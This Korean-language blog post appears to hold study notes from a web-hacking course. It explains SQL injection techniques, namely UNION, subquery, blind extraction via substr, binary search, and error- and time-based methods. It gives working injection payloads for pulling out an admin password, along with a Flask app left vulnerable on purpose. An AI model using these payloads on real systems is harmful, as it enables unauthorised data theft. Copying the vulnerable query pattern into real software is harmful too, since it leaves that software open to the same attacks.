---
layout: post
title: "SQL injection 1"
categories: [Web Hacking]
tags: [SQL Injection, UNION, Subquery, Application Logic, Blind SQL Injection, Error Based SQL Injection, Time Based SQL Injection]
last_modified_at: 2023-12-26
---

### [WHA-S] Background: SQL features 

#### 1. UNION 
**UNION:** select 구문 결과 결합하는 절  
union을 이용해서 다른 테이블에 접근 가능  
```sql
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHack PW";
```
UserTable 다 보여주고, username password 컬럼에 각각 DreamHack, DreamHack PW가 일치하는 데이터 조회  

**[Union 사용 조건]**  
1. 유니온 전후 구문 컬럼 개수 맞추기  
   -> ERROR 1222 (21000): The used SELECT statements have a different number of columns  
2. 유니온 전후 구문 컬럼 타입 동일  
   -> Conversion failed when converting the varchar value 'ABC' to data type int.  

**[UNION 모듈 실습]**  
union 구문 사용해서 admin의 패스워드 얻기  
user_table 컬럼 개수 3?  
uid에 admin' UNION SELECT '1' '#'  
수정해서 admin' UNION SELECT upw from user_table where 'admin' --  
Tomato인듯  

#### 2. Subquery 
**서브 쿼리(subquery):** 한 쿼리 내에 또 다른 쿼리 사용  
SELECT만 사용 가능  
서브쿼리를 이용해서 다른 테이블 접근 혹은 SELECT구문을 사용하지 않는 쿼리에서 SQL 인젝션 취약점이 존재할 때 사용  
```sql
mysql> SELECT 1,2,3,(SELECT 456);
```

**[COLUMNS절]**  
컬럼 절에서 서브 쿼리 사용 -> 단일 행, 단일 컬럼 반환되도록  

![COLUMNS절](https://blog.kakaocdn.net/dna/cbZn2P/btsCAi4qSg3/AAAAAAAAAAAAAAAAAAAAAAqWwR8xX3HMVQEXogBqYJjDXrkJpUN8B-BYa736lGaT/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=t5O4dhY0n9%2FIC49ERmWTCdL%2F88w%3D)

**[FROM절]**  
인라인 뷰 -> 다중 행과 다중 컬럼 반환되도록  

![FROM절](https://blog.kakaocdn.net/dna/cNlxux/btsCzHKaOGj/AAAAAAAAAAAAAAAAAAAAAPZBFgENuKmyKVw86rUoKEyPZymaIPkz9Kh0GyvLg4Qs/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=oHznjTGzSTs%2FdCoLsBPad0rRP3Y%3D)

**[WHERE절]**  
where절에서 서브 쿼리 -> 다중 행 반환되도록  

![WHERE절](https://blog.kakaocdn.net/dna/O0nmE/btsCKRRXFOD/AAAAAAAAAAAAAAAAAAAAAFkEPISDbPxvnP8zjiJQ4ssLB_74aBjNEVaTbB34XRjx/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=uATIlbJRaurmo3t%2B91T3iN2OTlQ%3D)

#### 3. application logic 
sql injection은 애플리케이션 내부에서 사용하는 db의 데이터 조작하는 기법  
공격자가 참거짓을 판단할 수 있다는 것에 근거하여 이루어지는 논리 공격  
```python
## pip3 install PyMySQL //pymysql 라이브러리를 설치하기 위한 명령어
from flask import Flask, request
import pymysql
app = Flask(__name__)

def getConnection():
    return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

@app.route('/', methods=['GET'])
def index():
    username = request.args.get('username')
    sql = "select username from users where username='%s'" %username
    conn = getConnection()
    curs = conn.cursor(pymysql.cursors.DictCursor)
    curs.execute(sql)
    rows = curs.fetchall()
    conn.close()
    if(rows[0]['username'] == "admin"):
        return "True"
    else:
        return "False"

app.run(host='0.0.0.0', port=8000)
```
username이 admin이면 true 반환 파이썬 코드  

**[UNION을 이용한 공격]**  
/?username=' union select 'admin' -- -  
union 이후 절에서 admin 반환하기 때문에 true  

**[비교 구문을 사용한 공격]**  
substr은 첫번째 인자로 전달된 문자열을 두번째 인자로 전달된 위치에서 시작하여 세번째 인자로 전달된 문자 수 만큼의 문자 반환  
이렇게 한 글자씩 false, true 대조하여 비밀번호 취득  
/?username=' union select if(substr(password,1,1)='B','admin', 'not admin') from users where username='admin' -- -  
-->> false  
/?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -  
-->> true  
첫번째 바이트 P  
/?username=' union select if(substr(password,2,1)='a','admin','not admin') from users where username='admin' -- -  
-->> true  
두번째 바이트 a  

**[truefalse SQL injection 모듈실습]**  
목표 3:  
upw에  
" or uid="admin" and substr(upw,1,1)="p  
를 넣어 한 글자씩 비교  

### [WHA-S] ExploitTech: Blind SQL Injection Advanced 
#### 1. Binary Search
이진 탐색은 이미 정렬된 리스트에서 임의값을 효율적으로 찾기 위한 알고리즘  
범위 지정(중간값 설정) -> 범위 조절(중간값과 비교 후 범위 재지정) 반복  
substr함수의 반환값을 아스키 문자 범위 32~126 사이에서 이진탐색  
32~126 중간값 79  
```sql
mysql> select * from users where username='admin' and ascii(substr(password,1,1))>79;
```

#### 2. Bit 연산 
아스키는 0부터 127 범위의 문자 표현 가능 -> 7비트로 하나의 문자 표현 가능  
bin 함수 사용해서 7번의 쿼리로 한 바이트 문자 알아낼 수 있음  
```sql
mysql> select * from users where username='admin' and substr(bin(ord(password)),1,1)=1;
```

### [WHA-S] ExploitTech: Error & Time based SQL injection 
#### 1. error based sql injection
임의로 에러 발생 -> 정보 취득  
```python
## pip3 install PyMySQL //pymysql 라이브러리를 설치하기 위한 명령어
from flask import Flask, request
import pymysql

app = Flask(__name__)

def getConnection():
    return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')

@app.route('/', methods=['GET'])
def index():
    username = request.args.get('username')
    sql = "select username from users where username='%s'" %username

    conn = getConnection()
    curs = conn.cursor(pymysql.cursors.DictCursor)
    curs.execute(sql)
    rows = curs.fetchall()
    conn.close()

    if(rows):
        return "True"
    else:
        return "False"

app.run(host='0.0.0.0', port=8000, debug=True)
```
flask 프레임워크 개발 -> 디버그 모드 활성화 -> 오류 발생 원인 제공  

![Error based SQL injection](https://blog.kakaocdn.net/dna/bX2Iel/btsCLaw05gb/AAAAAAAAAAAAAAAAAAAAAO9vDeF283f3vyrAV84IwEpELZq4_Clu7uoiZjoSagL3/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=pAMzwavP1XNQ1PpBbylJCw1I5Rg%3D)  
syntax error 발생, 위 오류 페이지에서 쿼리 실행 결과를 노출하지 X  
런타임(쿼리가 실행되고) 발생하는 에러 필요  

extractvalue: 첫번째 인자로 전달된 xml 데이터에서 두번째 인자인 xpath식을 통해 데이터 추출  
이때 xpath 식이 올바르지 않으면 에러메시지와 함께 잘못된 식 출력  
위 부분 복습 필요  

#### 2. time base sql injection 
시간 지연을 이용해 참거짓 판단  
헤비 쿼리 이용하여 시간 지연  

**MYSQL에서**  
**[sleep 함수 사용]**  
if 조건문 참 -> sleep 함수  
쿼리 실행이 끝난 후 "1 row in set (1.00sec)" 출력  
```sql
mysql> SELECT sleep(1);
```

**[benchmark 함수 사용]**  
benchmard( count, expr )  
```sql
mysql> SELECT benchmark(40000000,SHA1(1));
```

**[헤비 쿼리 사용]**  
```sql
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
```

**MSSQL에서**  
**[WAITFOR 함수 사용]**  
```sql
SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
```

**[헤비 쿼리 사용]**  
```sql
select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F);
```

**SQLite에서**  
**[헤비 쿼리 사용]**  
```sql
sqlite> .timer ON
sqlite> SELECT LIKE('abcdefg',upper(hex(randomblob(1500000000/2)));
```